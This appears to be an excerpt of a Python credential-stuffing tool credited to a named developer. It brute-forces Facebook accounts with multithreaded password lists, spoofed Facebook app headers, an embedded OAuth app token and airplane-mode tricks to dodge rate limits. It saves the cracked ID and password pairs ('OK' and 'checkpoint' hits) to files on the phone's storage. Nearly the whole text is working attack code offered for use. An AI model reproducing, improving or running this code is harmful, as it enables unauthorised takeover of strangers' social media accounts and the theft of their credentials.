...
def shelly_istri_tercinta():
    rr = random.randint
    rc = random.choice
    versi_wibu_sama_anime = random.choice(['2.3.0','3.0.1','4.2.2','5.0.1','6.1.1','7.0.0','8.2.0','9.0','10','11','12'])
...
\033[1;91m   #### \033[1;93m  ## ## \033[1;96m ##  ##\033[1;95m  #### \033[1;97m  #### \033[1;92m ##  ##
┏━━━━━━━━━━━━━━━━━━ ⋆⋅☆⋅⋆ ━━━━━━━━━━━━━━━━━━━┓
┃ DEVELOPER   :   SWAJON AHMED               ┃
┃ FACEBOOK    :   Fb.com/SwajonAhmedOfficial ┃
┃ YOUTUBE     :   Yt.com/SwajonAhmedOfficial ┃
┃ GITHUB      :   Gh.com/SwajonAhmedOfficial ┃
┃ VERSION     :   1.2.7                      ┃
...
def login():
        ...
        try:
                ...
                tok=open('data/token.txt','r').read()
                ...
                os.system('rm -rf data/token.txt');time.sleep(1);import ap
...
def public():
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print('\033[1;32m[•] NOW WAIT FOR RESULTS AND CHECK YOUR LUCK ! ')
                        print('\033[1;32m[•] TOTAL IDS     : '+total_ids+f)          
                        print('\033[1;32m[•] CHOICE METHOD : M'+mthd)  
                        print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                        print('\033[1;31m[•] TURN ON\OFF AIRPLANE MOOD EVERY 500 ID [•] ')
                        print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                        for user in id:
                                ids,names = user.split('|')
                                passlist = plist
                                if mthd in ['1','01']:
                                        crack_submit.submit(crack,ids,names,passlist)
                                elif mthd in ['2','02']:
...
def menu():
        ...
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print('\033[1;32m [1] FILE CRAKING ')
                        print(' [2] CREATE/MAKE FILE   ')
                        print(' [3] PUBLIC ID CRAKING ')
                        print(' [4] RANDOM NUMBER CRAKING')
                        print(' [5] RANDOM GMAIL CRAKING ')
                        print(' [6] JOIN OUR WHATSAPP GROUP ') 
                        print('\033[1;31m [0] EXIT PROGGRAM')
                        linex()
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        for user in fo:
                                                ...
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(metode_api,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                        ...
                        linex()
                        tks = ("Hi SWAJON Sir, I Need To Buy Your Paid SWAJON PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SWAJON.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SWAJON:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;32m[•] NOW WAIT FOR RESULTS AND CHECK YOUR LUCK ! ')
                        ...
                        for psx in user:
                                ...
                                SWAJON.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
                ...
                with tred(max_workers=30) as SWAJON:
                        ...
                        clear()
                        print('\033[1;32m[•] NOW WAIT FOR RESULTS AND CHECK YOUR LUCK ! ')
                        print('\033[1;32m[•] TOTAL IDS    : '+total)
#                        print('\033[1;32m[•] CHOICE METHOD : '+mthd)
                        print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                        print('\033[1;31m[•] TURN ON\OFF AIRPLANE MOOD EVERY 500 ID [•] ')
                        print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                        for user in fo:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;32m[★彡𝚂𝚆𝙰𝙹𝙾𝙽 𝙲𝚁𝙰𝙺𝙸𝙽𝙶彡★] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        SWAJON=session.cookies.get_dict().keys()
                        if "c_user" in SWAJON:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[SWAJON-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SWAJON-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SWAJON:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m[SWAJON-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SWAJON-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[SWAJON-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SWAJON-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                head = {
                                        ...
                                        'user-agent': "Mozilla/5.0 (Linux; Android 10; TECNO CD6j Build/QP 1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FBAN/EMA; FBLC/en_US; FBAV/297. 0.0.13.113;1",
                                        'content-type': 'application/x-www-form-urlencoded',
                                        'accept-encoding': 'gzip, deflate',
                                        'x-fb-http-engine': 'Liger',
                                        'x-fb-connection-type': 'unknown',
                                        'x-fb-connection-bandwidth': str(random.randint(2e4,4e4)),
                                        'x-fb-connection-quality': 'GOOD; q=0.7, rtt=66, rtx=0, c=10, mss=1360,tbw=485, uplat=1679, ullat=1',
                                        'x-fb-sim-hni': str(random.randint(2e4,4e4)), 'x-fb-net-hni': str(random.randint(2e4,4e4)),
                                        'x-fb-request-id':''.join(random.choice (string.ascii_uppercase+string.ascii_lowercase) for req in range(20)),
                                        'x-fb-rev': '1006637732'}
#           adid = str(uuid.uuid4()),
                                data = {
                                        'adid':adid,
                                        ...
                                        'generate_machine_id': '1',
                                        'locale': 'en_GB',
                                        'client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
    ...
    ###----------[ METODE API ]---------- ###
def metode_api(ids,names,passlist):
...
def crack(ids,names,passlist):
    ...
    #fff = '%'
    sys.stdout.write(f'\r\x1b[1;97m[\033[1;92m★彡𝚂𝚆𝙰𝙹𝙾𝙽 𝙲𝚁𝙰𝙺𝙸𝙽𝙶彡★\033[1;97m] {P}[{B}{(loop)}{P}]{H} OK>{(ok)} {K}CP>{(cp)}\r')
    sys.stdout.flush()
    ses = requests.Session()
    ua = random.choice(ugen)
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print('\x1b[1;93m[SWAJON-CP] '+idf+'|'+pw+'\33[0;97m ')
                open('/sdcard/SWAJON-CP.txt', 'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
                ...
                print('\x1b[1;92m[SWAJON-OK] '+idf+'|'+pw+'\33[0;97m ')
                open('/sdcard/SWAJON-OK.txt', 'a').write(idf+'|'+pw+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                head = {
                                        ...
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 859664038478197|QPv_xSgOp05D1p-efPlEiLECvMc',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SWAJON-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m[SWAJON-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SWAJON-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m[SWAJON-OK] '+uid+' | '+pas+'\033[1;97m')
